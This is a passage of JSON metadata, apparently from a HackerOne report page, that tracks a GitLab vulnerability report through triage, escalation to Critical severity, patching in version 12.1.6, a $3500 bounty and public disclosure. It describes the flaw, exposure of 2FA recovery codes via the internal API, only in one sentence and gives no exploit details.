BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026X-Amz-Signature=2ef30a499edb7750834e5c9a53f35afb14328c9f9d36d635cc2f530ec60f0b43"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5400435,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for de additional details, we have been able to reproduce the behaviour described and we are escalating this issue since it's possible to retrieve 2FA recovery codes of anyone that has registered a SSH key through the internal API.","markdown_message":"\u003cp\u003eThank you for de additional details, we have been able to reproduce the behaviour described and we are escalating this issue since it\u0026#39;s possible to retrieve 2FA recovery codes of anyone that has registered a SSH key through the internal API.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-23T13:01:00.508Z","updated_at":"2019-07-23T13:01:00.508Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5400437,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-23T13:01:08.515Z","updated_at":"2019-07-23T13:01:08.515Z","additional_data":{"old_severity":"High","new_severity":"Critical","old_severity_id":469937,"new_severity_id":471666},"actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5423766,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @vakzz,\n\nThe GitLab issue created from your report is currently scheduled for 2019-08-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe GitLab issue created from your report is currently scheduled for 2019-08-22.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-07-25T04:27:10.663Z","updated_at":"2019-07-25T04:27:10.663Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5631721,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi,\n\nThank you again for the report! Your finding has been patched in GitLab version 12.1.6.\n\nWe are awarding a $3500 bounty for this issue because it only affects GitLab instances running on docker for macOS.\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 12.1.6.\u003c/p\u003e\n\n\u003cp\u003eWe are awarding a $3500 bounty for this issue because it only affects GitLab instances running on docker for macOS.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-21T20:51:32.270Z","updated_at":"2019-08-21T20:51:32.270Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"vakzz","url":"/vakzz"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5631724,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-21T20:51:45.452Z","updated_at":"2019-08-21T20:51:45.452Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"3500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6029413,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-14T04:10:29.894Z","updated_at":"2019-10-14T04:10:29.894Z","first_to_agree":true,"actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6553661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hackerjuan,\n\nIs this ok to be disclosed?\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIs this ok to be disclosed?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-16T00:58:56.052Z","updated_at":"2019-12-16T00:58:56.052Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6583870,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-19T00:24:21.005Z","updated_at":"2019-12-19T00:24:21.005Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6583871,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-19T00:24:21.101Z","updated_at":"2019-12-19T00:24:21.101Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}